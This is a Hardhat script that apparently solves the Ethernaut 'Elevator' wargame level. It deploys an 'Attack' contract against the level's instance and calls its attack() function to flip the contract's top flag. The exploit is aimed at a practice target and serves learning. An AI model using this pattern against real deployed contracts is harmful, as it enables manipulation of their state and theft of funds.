const { ethers } = require("hardhat");
const { subtask } = require("hardhat/config");

async function main () {
    const useraddr = "0xdD2FD4581271e230360230F9337D5c0430Bf44C0";
    const instanceaddr = "0xBf5A316F4303e13aE92c56D2D8C9F7629bEF5c6e";
    const signer = await ethers.getSigner(useraddr);
    const contract = await ethers.getContractAt(
        "Elevator",
        instanceaddr,
        signer
    );
    const _acontract = await ethers.getContractFactory("Attack");
    const deploy = await _acontract.deploy(instanceaddr);

    let floor = await contract.floor();
    console.log("Initial floor :", floor);
    let clam = await deploy.attack();
    clam.wait();
    console.log(clam.hash);
    let top = await contract.top();
    console.log(top);
}

main().catch((error => {
    console.log(error);
    process.exit(1);
}))
